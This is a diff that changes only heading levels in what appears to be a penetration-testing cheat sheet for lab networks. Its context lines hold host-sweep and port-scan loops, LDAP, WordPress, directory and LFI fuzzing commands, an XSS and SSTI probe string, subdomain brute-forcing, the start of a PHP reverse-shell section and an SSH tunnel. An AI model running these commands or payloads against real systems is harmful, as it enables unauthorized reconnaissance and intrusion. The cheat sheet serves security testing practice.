@@ -3,21 +3,21 @@
 
 
 <details>
-    <summary><H5>Host Discovery (External)</H5></summary>
+    <summary><H3>Host Discovery (External)</H3></summary>
     
     fping -ag 10.10.110.0/24 2>/dev/null | tee external-ips ; \
     for ip in $(cat external-ips); do nmap=$(nmap -p- --max-retries 1 --min-rate 10000 --open "$ip" | grep -vE 'Warning:|filtered|latency|Starting'); echo "$nmap"; ports=$(echo "$nmap" | sed -n 's|/.*||p' | paste -sd ','); echo "nmap -sC -sV -Pn -p$ports $ip"; echo; done
 </details>
 
 <details>
-    <summary><H5>Host Discovery (Internal)</H5></summary>
+    <summary><H3>Host Discovery (Internal)</H3></summary>
     
     fping -ag 172.16.1.0/24 2>/dev/null | tee internal-ips ; \
     for ip in $(cat internal-ips); do nmap=$(nmap -p- --max-retries 1 --min-rate 10000 --open "$ip" | grep -vE 'Warning:|filtered|latency|Starting'); echo "$nmap"; ports=$(echo "$nmap" | sed -n 's|/.*||p' | paste -sd ','); echo "nmap -sC -sV -Pn -p$ports $ip"; echo; done
 </details>
 
 <details>
-    <summary><H5>Service Enumeration</H5></summary>
+    <summary><H3>Service Enumeration</H3></summary>
     
     nmap -Pn -sC -sV 172.16.1.10 -p22,80,139,445
     ldap=$(nmap --script "ldap* and not brute" -p 389 172.16.1.10); echo "$ldap"
@@ -38,33 +38,33 @@
 </details>
 
 <details>
-    <summary><H5>Web Enumeration</H5></summary>
+    <summary><H3>Web Enumeration</H3></summary>
 
-   <h3>Technology Discovery</h3>
+   <h5>Technology Discovery</h5>
    
     whatweb http://10.10.110.100
     
-   <h3>WordPress Discovery</h3>
+   <h5>WordPress Discovery</h5>
    
     wpscan --url http://10.10.110.100/wordpress --enumerate
     
-   <h3>Directory Discovery</h3>
+   <h5>Directory Discovery</h5>
 
     ffuf -u 'http://10.10.110.100/FUZZ' -t 400 -rate 10000 -e .php -v -recursion -mc 200,301 \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     2>/dev/null | grep -oP '(http.*)(?<!/)$'
     
-<h3>Directory Traversal</h3>
+<h5>Directory Traversal</h5>
 
     ffuf -u 'http://10.10.110.100/nav.php?page=FUZZ' -t 400 -rate 10000 -v -mc 200 \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     2>/dev/null | grep -oP '(http.*)(?<!/)$'
     
-   <h3>XSS + SSTI</h3>
+   <h5>XSS + SSTI</h5>
    
     <img src=x>'"${{7*7}}
     
-   <h3>Subdomain Discovery</h3>
+   <h5>Subdomain Discovery</h5>
    
     gobuster vhost --append-domain -u example.com -k -r -t200 -q \
     -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
@@ -72,7 +72,7 @@
 </details>
 
 <details>
-    <summary><H5>Exploitation</H5></summary>
+    <summary><H3>Exploitation</H3></summary>
     
     [*] Reverse Shells
     <?php
@@ -97,7 +97,7 @@
 </details>
 
 <details>
-    <summary><H5>Post Exploitation</H5></summary>
+    <summary><H3>Post Exploitation</H3></summary>
     
     [*] Linux
     ssh user@xxxxxxxxx -i id_rsa -L 33060:localhost:33060
